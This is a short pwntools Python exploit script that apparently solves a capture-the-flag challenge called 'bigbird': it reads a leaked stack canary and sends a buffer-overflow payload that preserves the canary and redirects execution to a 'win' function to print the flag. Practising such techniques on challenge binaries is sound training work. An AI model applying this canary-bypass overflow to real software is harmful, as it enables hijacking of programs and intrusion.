from pwn import *

exe = context.binary = ELF("bigbird")
remotehost = ("bigbird.challs.olicyber.it", 12006)

r = remote(*remotehost) if args.REMOTE else process([exe.path])
r.recvuntil(b"BIG BIRD: ")
canary = int(r.recvline(False), 16)
r.sendlineafter(b"good music", flat({0x28: canary, 0x38: exe.sym['win']}))
r.recvlines(2)
flag = r.recvline().decode()
print(flag)
r.close()